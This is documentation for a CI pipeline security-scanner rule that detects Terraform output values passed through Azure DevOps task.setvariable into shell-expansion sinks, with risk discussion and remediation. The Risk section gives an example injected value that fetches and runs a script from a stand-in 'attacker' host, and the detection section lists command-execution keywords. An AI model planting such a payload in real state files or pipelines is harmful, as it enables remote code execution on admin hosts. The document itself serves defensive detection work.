# Terraform Output via `setvariable` to Shell Expansion

**Rule ID:** `terraform_output_via_setvariable_shell_expansion`
**Severity:** High
**Category:** Injection
**Tags:** security, injection, azure-devops

## Detection

The rule looks for a two-step injection chain inside a single ADO job. The
chain has a *capture* phase and a *sink* phase; both must be present for
the rule to fire, and the two steps must share the same `META_JOB_NAME`.

**Phase 1 — capture step.** A `Step` node whose `META_SCRIPT_BODY`
(populated by the ADO parser from inline `script:`, `bash:`, `pwsh:`,
`Bash@3.inputs.script`, `PowerShell@2.inputs.script`,
`AzureCLI@2.inputs.inlineScript`, `AzurePowerShell@5.inputs.Inline`)
contains BOTH:

1. A "terraform output capture" signal — any of:
   - the literal substring `terraform output` (matches `terraform output`,
     `terraform output -raw NAME`, `terraform output -json`),
   - a PowerShell-form env-var read `$env:TF_OUT_...` or `${env:TF_OUT_...}`,
   - a POSIX-form env-var read `$TF_OUT_...` or `${TF_OUT_...}`. The
     `TF_OUT_*` naming convention is the standard pattern emitted by the
     `TerraformCLI@*` task family with `command: output`, where the
     subsequent step receives the outputs as `TF_OUT_<NAME>` env vars.
2. At least one `##vso[task.setvariable variable=NAME ...]` directive. The
   rule extracts every variable name set by the directive (terminated by
   `;`, `]`, or whitespace) and tracks them as candidate sink variables.
   Names must be `[A-Za-z0-9_.]+`.

The rule does **not** attempt to data-flow-link the captured value to the
specific `setvariable` directive — proximity inside a single inline
script is the operative signal. In both corpus exemplars the capture and
the `setvariable` are paired inside the same PowerShell block.

**Phase 2 — sink step.** A *later* Step in the same job (matched on
`META_JOB_NAME`, ordered by graph insertion order = YAML order) whose
`META_SCRIPT_BODY` references `$(NAME)` (for some `NAME` from Phase 1) in
shell-expansion position. "Shell-expansion position" is any of:

- the body contains `bash -c`, `sh -c`, `eval `, `Invoke-Expression`,
  `iex(`, `iex (`, ` iex `, `Invoke-Command`, or `-split` *anywhere* —
  a `$(NAME)` reference in a script that also uses one of these primitives
  is at risk of reaching the interpreter,
- the `$(NAME)` reference sits inside an outer command substitution
  (`$( ... $(NAME) ... )` — detected per-line by counting unmatched `$(`
  occurrences in the prefix),
- the `$(NAME)` reference is line-leading and unquoted, so it parses as a
  command word (e.g. `$(GDSVMS) some args`).

When Phase 1 and Phase 2 both hold for the same job, the rule emits one
finding per `(capture_step, sink_step, captured_var)` triple, citing both
step IDs in `nodes_involved`.

## Risk

Terraform `output` values are not credentials — they are infrastructure
descriptors (VM hostnames, IP addresses, resource group names). The
attack surface is the **state backend** that holds them, not the
pipeline. A typical setup writes Terraform state to an S3 bucket or Azure
Storage account; if the bucket policy / Storage RBAC is broader than the
ADO project's permissions (a very common drift), an attacker who can
modify the state file can substitute a benign-looking VM name like
`vm1.domain.com` with a payload like
`vm1.domain.com,; iex (irm http://attacker/x.ps1)`.

Once that value is captured into a `TF_OUT_*` env var and laundered
through `##vso[task.setvariable variable=gdsvms]` into the pipeline
variable space, the next step that does
`$GDSvmNames = "$(gdsvms)" -split ","` followed by
`foreach ($vm in $GDSvmNames) { Invoke-Command -ComputerName $vm ... }`
executes the attacker's payload on whatever target the
`Invoke-Command` was meant to reach — frequently a domain controller or
a Key Vault-backed admin host.

Two existing rules cover **adjacent** but distinct primitives:

- [`secret_to_inline_script_env_export`](secret_to_inline_script_env_export.md)
  catches `$(SECRET)` → shell variable inside a *single* step.
- [`parameter_interpolation_into_shell`](parameter_interpolation_into_shell.md)
  catches `${{ parameters.X }}` → shell inside a *single* step.

Neither rule reasons across the `task.setvariable` hop, and neither
treats Terraform-output values as a tainted source. This rule covers
exactly that gap: the value is not a secret, the source is not a pipeline
parameter, and the two operations span two separate steps that the
existing rules look at in isolation.

## Remediation

1. **Pass the value via the downstream step's `env:` block** — the
   runtime quotes the value as a shell variable and the script body
   never YAML-interpolates the raw text:

   ```yaml
   - task: AzurePowerShell@5
     inputs:
       Inline: |
         $vmNames = $env:GDSVMS -split ","
         foreach ($vm in $vmNames) { Invoke-Command -ComputerName $vm -ScriptBlock $sb }
     env:
       GDSVMS: $(gdsvms)
   ```

2. **Validate the shape before splitting/looping.** A comma-separated
   list of hostnames has a tight grammar — enforce it:

   ```powershell
   if ($env:GDSVMS -notmatch '^[a-zA-Z0-9._,-]+$') {
     throw "GDSVMS contains unexpected characters; refusing to proceed"
   }
   ```

3. **Lock down the Terraform state backend.** The pipeline trusts the
   state file. Ensure the S3 bucket / Storage account that holds state
   is writable only by identities at least as privileged as the pipeline
   itself — and ideally by the pipeline alone via OIDC.

4. **Verify:** Re-run `taudit scan --platform azure-devops`. The rule
   clears when either (a) the downstream step uses `env:` instead of
   `$(NAME)`, or (b) the capture step no longer emits the
   `task.setvariable` directive (e.g. the value is consumed inline within
   the same step).

## See also

- [secret_to_inline_script_env_export](secret_to_inline_script_env_export.md) — single-step shell-variable laundering for pipeline secrets
- [parameter_interpolation_into_shell](parameter_interpolation_into_shell.md) — single-step interpolation of free-form parameters into shell
- [self_mutating_pipeline](self_mutating_pipeline.md) — `##vso[task.setvariable]` as a generic environment-gate write primitive
- [vm_remote_exec_via_pipeline_secret](vm_remote_exec_via_pipeline_secret.md) — the remote-exec sink primitive (`Invoke-Command`, `Set-AzVMExtension`) on its own
- [Microsoft Learn — task.setvariable logging command](https://learn.microsoft.com/azure/devops/pipelines/scripts/logging-commands#setvariable-initialize-or-modify-the-value-of-a-variable)
- [Terraform — Backend security considerations](https://developer.hashicorp.com/terraform/language/state/backends)
